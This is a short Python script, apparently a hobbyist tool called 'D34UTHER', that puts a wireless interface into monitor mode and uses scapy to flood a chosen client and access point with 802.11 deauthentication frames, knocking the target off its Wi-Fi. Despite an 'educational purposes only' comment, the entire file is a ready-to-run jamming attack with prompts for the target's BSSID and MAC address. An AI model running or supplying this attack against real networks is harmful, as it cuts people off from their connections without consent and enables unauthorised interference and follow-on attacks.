#this is just a simple script for educational purposes only
import subprocess
from colorama import Fore,Style
from numpy import choose
from scapy.all import *

def banner():
  print("""
  ██████╗ ██████╗ ██╗  ██╗██╗   ██╗████████╗██╗  ██╗███████╗██████╗ 
  ██╔══██╗╚════██╗██║  ██║██║   ██║╚══██╔══╝██║  ██║██╔════╝██╔══██╗
  ██║  ██║ █████╔╝███████║██║   ██║   ██║   ███████║█████╗  ██████╔╝
  ██║  ██║ ╚═══██╗╚════██║██║   ██║   ██║   ██╔══██║██╔══╝  ██╔══██╗
  ██████╔╝██████╔╝     ██║╚██████╔╝   ██║   ██║  ██║███████╗██║  ██║
  ╚═════╝ ╚═════╝      ╚═╝ ╚═════╝    ╚═╝   ╚═╝  ╚═╝╚══════╝╚═╝  ╚═╝
                                                                    
  Maded by Eneajkl

  Version:1.1

  """)

def networkmanagerfinder():
    file=open("networkmanager.txt","r",encoding="utf-8")
    manager=file.read()
    subprocess.call(["rm","networkmanager.txt"])
    manager=str(manager)
    manager=manager.split("N")
    manager=("N"+manager[1])
    manager=manager.split(".")
    manager=manager[0]
    return manager

networkmanger = str(networkmanagerfinder())

def monitorModeOn():
  subprocess.call(["systemctl","stop",networkmanger])
  subprocess.call(["sudo","ifconfig", interface, "down"])
  subprocess.call(["sudo","iwconfig", interface, "mode", "monitor"])
  subprocess.call(["sudo","ifconfig", interface, "up"])

def monitorModeOff():
  subprocess.call(["ifconfig", interface, "down"])
  subprocess.call(["sudo","iwconfig", interface, "mode", "managed"])
  subprocess.call(["sudo","ifconfig", interface, "up"])
  subprocess.call(["sudo","systemctl","start",networkmanger])

print(Fore.LIGHTYELLOW_EX )
banner()
print(Fore.LIGHTRED_EX)

interface=str(input("Interface:"))

monitorModeOn()

bssid=str(input("BSSID: "))
targetmac=str(input("Target's MAC address: "))
choose=str(input("Start sending packets (Y/n)"))
if choose == "Y" or choose == "y":
  dot11 = Dot11(addr1=targetmac, addr2=bssid, addr3=bssid)
  packet = RadioTap()/dot11/Dot11Deauth(reason=7)
  sendp(packet, inter=0.1, count=99999999999999, iface=interface, verbose=1)
  monitorModeOff()
elif choose == "n" or choose == "N":
  monitorModeOff()

subprocess.call(["clear"])
print(Fore.LIGHTYELLOW_EX )
banner()
print(Fore.LIGHTRED_EX)
print("\nSee you later...\nPress any key to exit")
print(Style.RESET_ALL)
input()
